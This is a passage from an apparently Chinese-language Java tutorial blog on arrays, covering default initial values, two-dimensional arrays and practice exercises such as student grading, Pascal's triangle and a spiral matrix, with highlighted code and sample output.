System.out.println(ids.length);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt; ids.length;i++)&#123;</span><br><span class="line">            System.out.println(ids[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>五、数组元素的默认初始化值</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cj.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">4</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;arr.length;i++)&#123;</span><br><span class="line">            System.out.println(arr[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>⑤数组元素的默认初始化值</p>
<blockquote>
<p>数组元素是整型: 0<br>数组元素是浮点型: 0.0<br>数组元素是char型: 0或  ‘\u0000’，而非  ‘0’<br>数组元素是boolean型: false</p>
<p>数组元素是引用数据类型（String): null</p>
</blockquote>
<p>六、数组的内存解析</p>
<p><img src="/2022/04/13/JAVA/image-20220421154458033.png" alt="image-20220421154458033"></p>
<p><img src="/2022/04/13/JAVA/image-20220421222253633.png" alt="image-20220421222253633"></p>
<p>练习：</p>
<p>升景坊单间短期出租4个月，5500元/月(水电煤公摊，网费35元/月)。 空调、卫生间、厨房齐全。屋内均是IT行业人士，喜欢安静。所以要求来租者最好是同行或者刚毕业的年轻人，爱干净、安静。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cj.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">8</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">3</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span>[] index = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">2</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>&#125;;</span><br><span class="line">        String tel = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;index.length;i++)&#123;</span><br><span class="line">            tel+= arr[index[i]];</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;联系方式：&quot;</span>+ tel);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">联系方式：<span class="number">18013820100</span></span><br></pre></td></tr></table></figure>

<p>2.从键盘读入学生成绩，找出最高分,并输出学生成绩等级<br>➢成绩&gt;=最高分-10    等级为’A’<br>➢成绩&gt;=最高分-20    等级为’B’<br>➢成绩&gt;=最高分-30    等级为C’<br>➢其余                           等级为’D’<br>提示：先读入学生人数，根据人数创建int数组，存放学生成绩。</p>
<p><img src="/2022/04/13/JAVA/image-20220421223458940.png" alt="image-20220421223458940"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cj.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//1.读取学生个数</span></span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入学生人数：&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> number = scanner.nextInt();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.创建数组存储学生成绩，动态初始化</span></span><br><span class="line">        <span class="keyword">int</span>[] scores = <span class="keyword">new</span> <span class="keyword">int</span>[number];</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.给数组中元素赋值</span></span><br><span class="line">        System.out.println(<span class="string">&quot;请输入成绩：&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt; scores.length;i++)&#123;</span><br><span class="line">            scores[i] = scanner.nextInt();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4.获取数组中元素最大值</span></span><br><span class="line">        <span class="keyword">int</span> maxScore = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;scores.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(maxScore &lt; scores[i])&#123;</span><br><span class="line">                maxScore = scores[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//5.根据每个学生成绩与最高分差值，得到每个学生的等级，并输出等级和成绩</span></span><br><span class="line">        <span class="keyword">char</span> level;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;scores.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(maxScore-scores[i]&lt;=<span class="number">10</span>)&#123;</span><br><span class="line">                level=<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(maxScore-scores[i]&lt;=<span class="number">20</span>)&#123;</span><br><span class="line">                level=<span class="string">&#x27;B&#x27;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(maxScore-scores[i]&lt;=<span class="number">30</span>)&#123;</span><br><span class="line">                level=<span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                level=<span class="string">&#x27;D&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;student &quot;</span>+i+<span class="string">&quot; score is &quot;</span>+scores[i]+<span class="string">&quot; ,grade is &quot;</span>+level);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h3><p>1.理解:<br>对于二维数组的理解，我们可以看成是一维数组array1又作为另一 个一 维数组array 2的元素而存在。其实，从数组底层的运行机制来看，其实没有多维数组。</p>
<p>2.初始化</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cj.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayTest2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//二维数组的声明和初始化</span></span><br><span class="line">        <span class="keyword">int</span>[][] arr1 = <span class="keyword">new</span> <span class="keyword">int</span>[][]&#123;&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;,&#123;<span class="number">4</span>,<span class="number">5</span>&#125;,&#123;<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>&#125;&#125;; <span class="comment">//静态</span></span><br><span class="line">        String[][] arr2 = <span class="keyword">new</span> String[<span class="number">3</span>][<span class="number">2</span>];<span class="comment">//动态1</span></span><br><span class="line">        String[][] arr3 = <span class="keyword">new</span> String[<span class="number">3</span>][];<span class="comment">//动态2</span></span><br><span class="line">        <span class="keyword">int</span>[] arr4[]=<span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">3</span>][<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">int</span>[] arr5[] = &#123;&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;,&#123;<span class="number">4</span>,<span class="number">5</span>&#125;,&#123;<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>&#125;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3.调用</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cj.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayTest2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//二维数组的声明和初始化</span></span><br><span class="line">        <span class="keyword">int</span>[][] arr1 = <span class="keyword">new</span> <span class="keyword">int</span>[][]&#123;&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;,&#123;<span class="number">4</span>,<span class="number">5</span>&#125;,&#123;<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>&#125;&#125;; <span class="comment">//静态</span></span><br><span class="line">          String[][] arr2 = <span class="keyword">new</span> String[<span class="number">3</span>][<span class="number">2</span>];<span class="comment">//动态1</span></span><br><span class="line">          String[][] arr3 = <span class="keyword">new</span> String[<span class="number">3</span>][];<span class="comment">//动态2</span></span><br><span class="line"><span class="comment">//        int[] arr4[]=new int[3][2];</span></span><br><span class="line"><span class="comment">//        int[] arr5[] = &#123;&#123;1,2,3&#125;,&#123;4,5&#125;,&#123;6,7,8&#125;&#125;;</span></span><br><span class="line"></span><br><span class="line">        System.out.println(arr1[<span class="number">0</span>][<span class="number">1</span>]); <span class="comment">//2</span></span><br><span class="line">        System.out.println(arr1[<span class="number">0</span>]); <span class="comment">//&#123;1,2,3&#125;</span></span><br><span class="line">        System.out.println(arr2[<span class="number">1</span>][<span class="number">1</span>]); <span class="comment">//null</span></span><br><span class="line">        arr3[<span class="number">1</span>] = <span class="keyword">new</span> String[<span class="number">4</span>];</span><br><span class="line">        System.out.println(arr3[<span class="number">1</span>][<span class="number">0</span>]); <span class="comment">//如果没有上面的一句话，会报错（空指针），有上面一句话则输出null</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>4.二维数组的长度和遍历</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cj.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayTest2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//二维数组的声明和初始化</span></span><br><span class="line">        <span class="keyword">int</span>[][] arr1 = <span class="keyword">new</span> <span class="keyword">int</span>[][]&#123;&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;,&#123;<span class="number">4</span>,<span class="number">5</span>&#125;,&#123;<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>&#125;&#125;; <span class="comment">//静态</span></span><br><span class="line">        String[][] arr2 = <span class="keyword">new</span> String[<span class="number">3</span>][<span class="number">2</span>];<span class="comment">//动态1</span></span><br><span class="line">        String[][] arr3 = <span class="keyword">new</span> String[<span class="number">3</span>][];<span class="comment">//动态2</span></span><br><span class="line"><span class="comment">//      int[] arr4[]=new int[3][2];</span></span><br><span class="line"><span class="comment">//      int[] arr5[] = &#123;&#123;1,2,3&#125;,&#123;4,5&#125;,&#123;6,7,8&#125;&#125;;</span></span><br><span class="line"><span class="comment">//      数组长度：</span></span><br><span class="line"><span class="comment">//        System.out.println(arr1.length);  //3</span></span><br><span class="line"><span class="comment">//        System.out.println(arr1[1].length);//2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//      遍历数组</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>;i&lt;arr1.length;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j =<span class="number">0</span>;j&lt;arr1[i].length;j++)&#123;</span><br><span class="line">                System.out.print(arr1[i][j]+<span class="string">&quot; &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> </span><br><span class="line"><span class="number">4</span> <span class="number">5</span> </span><br><span class="line"><span class="number">6</span> <span class="number">7</span> <span class="number">8</span> </span><br></pre></td></tr></table></figure>

<p>5、二维数组元素默认初始化值</p>
<p>规定:二维数组分为外层数组的元素，内层数组的元素<br><code>int[][] arr = new int[4][3];</code><br>外层元素，<code>arr[0],arr[1]</code>等<br>内层元素: <code>arr[0][0] ,arr[1][2]</code>等</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cj.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayTest2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[][] arr = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">4</span>][<span class="number">3</span>];</span><br><span class="line">        System.out.println(arr[<span class="number">0</span>]);  <span class="comment">// [I@43a25848 地址值</span></span><br><span class="line">        System.out.println(arr[<span class="number">0</span>][<span class="number">0</span>]); <span class="comment">// 0</span></span><br><span class="line">        System.out.println(arr); <span class="comment">// [[I@3ac3fd8b  地址 [[：二维 I：int 3ac3fd8b：地址</span></span><br><span class="line">        System.out.println(<span class="string">&quot;******************************************&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">float</span>[][] arr1 = <span class="keyword">new</span> <span class="keyword">float</span>[<span class="number">4</span>][<span class="number">3</span>];</span><br><span class="line">        System.out.println(arr1[<span class="number">0</span>]);  <span class="comment">// [F@5594a1b5 地址值</span></span><br><span class="line">        System.out.println(arr1[<span class="number">0</span>][<span class="number">0</span>]); <span class="comment">// 0.0</span></span><br><span class="line">        System.out.println(<span class="string">&quot;******************************************&quot;</span>);</span><br><span class="line"></span><br><span class="line">        String[][] arr2 = <span class="keyword">new</span> String[<span class="number">4</span>][<span class="number">2</span>];</span><br><span class="line">        System.out.println(arr2[<span class="number">1</span>]);  <span class="comment">// [Ljava.lang.String;@880ec60</span></span><br><span class="line">        System.out.println(arr2[<span class="number">1</span>][<span class="number">1</span>]); <span class="comment">//null</span></span><br><span class="line">        System.out.println(<span class="string">&quot;******************************************&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">double</span>[][] arr3 = <span class="keyword">new</span> <span class="keyword">double</span>[<span class="number">4</span>][];</span><br><span class="line">        System.out.println(arr3[<span class="number">1</span>]); <span class="comment">//null</span></span><br><span class="line">        System.out.println(arr2[<span class="number">1</span>][<span class="number">0</span>]); <span class="comment">//空指针异常，报错</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>总结：</p>
<p>针对于初始化方式一:比如: <code>int[][] arr = new int[4][3];</code><br>外层元素的初始化值为:地址值<br>内层元素的初始化值为:与一维数组初始化情况相同</p>
<p>针对于初始化方式二:比如。<code>int[][] arr = new int[4][];</code>                                                                                                                            外层元素的初始化值为: nu1l<br>内层元素的初始化值为:不能谓用，否则报错</p>
<p>6、二维数组的内存解析</p>
<p><img src="/2022/04/13/JAVA/image-20220423134034832.png" alt="image-20220423134034832"></p>
<p>练习：</p>
<p><img src="/2022/04/13/JAVA/image-20220423145134544.png" alt="image-20220423145134544"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cj.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayTest2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[][] arr = <span class="keyword">new</span> <span class="keyword">int</span>[][]&#123;&#123;<span class="number">3</span>,<span class="number">5</span>,<span class="number">8</span>&#125;,&#123;<span class="number">12</span>,<span class="number">9</span>&#125;,&#123;<span class="number">7</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">4</span>&#125;&#125;;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;arr.length;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;arr[i].length;j++)&#123;</span><br><span class="line">                sum += arr[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(sum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/13/JAVA/image-20220423145631417.png" alt="image-20220423145631417"></p>
<p>x: int型一维数组； y是int型二维数组</p>
<p><img src="/2022/04/13/JAVA/image-20220423145653641.png" alt="image-20220423145653641"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cj.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayTest2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//1.声明并初始化二维数组</span></span><br><span class="line">        <span class="keyword">int</span>[][] yangHui = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>][];</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.数组元素赋值</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ;i&lt;yangHui.length;i++)&#123;</span><br><span class="line">            yangHui[i] = <span class="keyword">new</span> <span class="keyword">int</span>[i+<span class="number">1</span>];</span><br><span class="line">            <span class="comment">//2.1给首末元素赋值</span></span><br><span class="line">            yangHui[i][<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">            yangHui[i][i]=<span class="number">1</span>;</span><br><span class="line">            <span class="comment">//2.2 给其他元素赋值</span></span><br><span class="line">            <span class="keyword">if</span>(i&gt;<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;yangHui[i].length-<span class="number">1</span>;j++)&#123;</span><br><span class="line">                    yangHui[i][j]=yangHui[i-<span class="number">1</span>][j-<span class="number">1</span>]+yangHui[i-<span class="number">1</span>][j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//3.遍历</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ;i&lt;yangHui.length;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ;j&lt;yangHui[i].length;j++)&#123;</span><br><span class="line">                System.out.print(yangHui[i][j]+<span class="string">&quot; &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="数组中涉及的常见算法"><a href="#数组中涉及的常见算法" class="headerlink" title="数组中涉及的常见算法"></a>数组中涉及的常见算法</h3><h4 id="数组元素的赋值"><a href="#数组元素的赋值" class="headerlink" title="数组元素的赋值"></a>数组元素的赋值</h4><p>回形数：</p>
<p><img src="/2022/04/13/JAVA/image-20220423153417887.png"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cj.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HuiXingShu</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入您想要的大小：&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> num = scan.nextInt();</span><br><span class="line">        <span class="keyword">int</span>[][] arr = <span class="keyword">new</span> <span class="keyword">int</span>[num][num];</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;  <span class="comment">//行</span></span><br><span class="line">        <span class="keyword">int</span> j = <span class="number">0</span>;  <span class="comment">//列</span></span><br><span class="line">        <span class="keyword">int</span> n = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> maxi = num-<span class="number">1</span>,maxj=num-<span class="number">1</span>,mini=<span class="number">0</span>,minj=<span class="number">0</span>;<span class="comment">//maxi:行最大值，maxj:列最大值，mini：行最小，minj：列最小</span></span><br><span class="line">        <span class="keyword">int</span> k=<span class="number">1</span>;<span class="comment">//决定方向</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (n&lt;=num*num)&#123;</span><br><span class="line">            <span class="comment">//向右</span></span><br><span class="line">            <span class="keyword">if</span>(k==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(j&lt;=maxj &amp;&amp; arr[i][j]==<span class="number">0</span>)&#123;</span><br><span class="line">                    arr[i][j++]=n++;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    k=<span class="number">2</span>;</span><br><span class="line">                    j--; <span class="comment">//上面if语句最后j++，变成了maxj+1</span></span><br><span class="line">                    i++;</span><br><span class="line">                    maxj--;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span 